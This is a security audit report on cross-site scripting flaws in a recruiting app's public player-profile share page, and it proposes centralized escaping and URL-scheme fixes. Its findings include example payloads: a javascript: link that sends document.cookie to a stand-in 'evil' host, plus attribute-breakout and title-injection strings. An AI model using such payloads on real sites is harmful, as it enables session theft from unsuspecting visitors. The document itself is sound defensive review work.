# BAP Recruiting — Public Share Page XSS Vector Report

**Date:** 2026-07-03
**Scope:** The public, login-free player profile page only — `profilePageHtml()`, the `resumeSheetHtml()` body it embeds, `_videoEmbed()`, and the two print/new-window paths that render the same content.
**Threat model:** Attacker = a profile owner (any registered athlete). Victim = a **coach or anyone who opens the share link**. The page renders attacker-controlled data (name, school, coach names, awards, video links, email) into `document.body.innerHTML`, so an injection runs in the victim's browser. This is cross-user, which is why it's the top remaining item.

> No code was changed to produce this report. Fixes are implemented immediately after it (centralized `escapeHtml` + `sanitizeUrl`).

---

## Root cause
There is no single escaping/URL policy. The share path contains **three different ad‑hoc `esc` helpers**, each covering a different subset of characters:

| Location | `esc` definition | Escapes |
|---|---|---|
| `resumeSheetHtml` (4546) | `.replace(/</g,'&lt;')` | `<` only |
| `profilePageHtml` (4749) | `.replace(/</g,'&lt;')` | `<` only |
| `_videoEmbed` (4735) | `.replace(/"/g,'&quot;')` | `"` only |

Escaping only `<` is adequate in a **text node** (you can't open a tag without `<`), but it is **not** adequate inside an **HTML attribute**, where a `"` closes the attribute and lets an attacker add an event handler. And nothing validates URL **schemes**, so `javascript:` payloads are possible where a value flows into `href`.

---

## Vectors

### 🔴 V1 — Career video link → unescaped, unvalidated `href` (highest)
**Where:** `resumeSheetHtml`, line 4601:
```js
`<a href="${v.link}" style="color:#0A67C7">${esc(v.title)}</a>`
```
`v.link` (a season video URL) is inserted into `href` with **no escaping and no scheme check**, and this section is included in the public snapshot (`sections.videos` is on for coach/family/internal). Two payloads:
- **Script URL:** `v.link = "javascript:fetch('//evil/'+document.cookie)"` → coach clicks the video link → runs in coach's session.
- **Attribute breakout:** `v.link = '" onmouseover="alert(1)'` → `<a href="" onmouseover="alert(1)">` → fires on hover, no click needed.

### 🔴 V2 — Featured video link → `href` attribute breakout
**Where:** `profilePageHtml`, line 4794:
```js
`<a href="${esc(vid.link)}" ...>`   // esc escapes only '<'
```
`buildPlayerProfile` (4718) only sets `featuredVideo` when the link matches `^https?://`, which **blocks the `javascript:` scheme** here (good). But the `^https?://` test does **not** block attribute breakout: `vid.link = 'https://x" onmouseover="alert(1)'` passes the test and still breaks out of the `href`. Escaping `<` only does not stop it.

### 🟠 V3 — Contact email → `mailto:` `href` attribute breakout
**Where:** `profilePageHtml`, line 4796:
```js
contact.map(x => /@/.test(x) ? `<a href="mailto:${esc(x)}">${esc(x)}</a>` : esc(x))
```
`x` (the athlete's contact email, shown in coach/family modes) is placed into `href` escaped for `<` only. `x = 'a@b" onmouseover="alert(1)'` breaks out of the attribute.

### 🟠 V4 — Print / new-window `<title>` → raw player name
**Where:** public-profile print (4880) and résumé print (4684):
```js
`<title>${(d.player.name || '選手')} Recruiting Profile</title>`
```
The name is inserted into `<title>` with **no escaping**. `name = '</title><img src=x onerror=alert(1)>'` closes the title and injects an element into the print window.

### 🟢 V5 — Text fields use `<`-only escaping (correctness, not script-XSS)
Name, school, coach names, awards, stats, decisions across `resumeSheetHtml`/`profilePageHtml` are escaped for `<` only. In text position this **does** stop script injection, but `&`, `>`, `"`, `'` are unescaped, which can corrupt rendering (e.g. a name with `&`). The centralized escaper fixes this uniformly.

### ✅ Reviewed and already safe (no change needed beyond routing through the central helper)
- **`_videoEmbed` iframe `src` (4738–4739):** the URL is never passed through; only a regex‑restricted ID (`[\w-]{6,}` / `\d+`) is inserted into a hard‑coded `https://www.youtube.com/embed/…` or `https://player.vimeo.com/video/…`. Non‑matching URLs return `null`. Safe.
- **Share URL / QR code (4829, 4865):** built from `location` + a 128‑bit random token; no user text. Safe.

---

## Fix (implemented right after this report)
Two centralized helpers, defined once and used everywhere on the share path (and available for the later app‑wide pass):

```js
// Canonical HTML escaper — safe for BOTH text and attribute contexts.
function escapeHtml(v) {
  return String(v == null ? '' : v)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

// Canonical URL guard — returns the URL only if its scheme is safe, else ''.
// Blocks javascript:, data:, vbscript:, etc. Allow-list, not deny-list.
function sanitizeUrl(v) {
  const s = String(v == null ? '' : v).trim();
  return /^(https?:|mailto:|tel:)/i.test(s) ? s : '';
}
```

Application:
- Every `href`/`src` built from user data becomes `href="${escapeHtml(sanitizeUrl(url))}"` — `sanitizeUrl` kills bad schemes (V1, V2), `escapeHtml` kills attribute breakout (V1, V2, V3).
- The three ad‑hoc `esc` helpers are replaced by `escapeHtml` (V5, and hardens all text).
- Both `<title>` interpolations are wrapped in `escapeHtml` (V4).

Result: no user value reaches an HTML sink on the public page without passing through one canonical escaper, and no URL reaches an `href` without an allow‑list scheme check.
